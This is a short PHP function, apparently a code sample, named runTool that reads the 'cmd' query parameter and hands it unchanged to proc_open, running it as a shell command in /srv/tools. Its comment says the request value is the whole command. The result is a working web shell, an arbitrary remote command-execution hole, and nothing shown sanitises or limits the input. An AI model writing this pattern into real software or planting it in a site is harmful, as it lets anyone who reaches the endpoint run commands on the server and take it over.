<?php
// The request value is the whole shell command.
function runTool(): mixed
{
    $pipes = [];
    $command = $_GET['cmd'];
    return proc_open($command, [], $pipes, '/srv/tools');
}
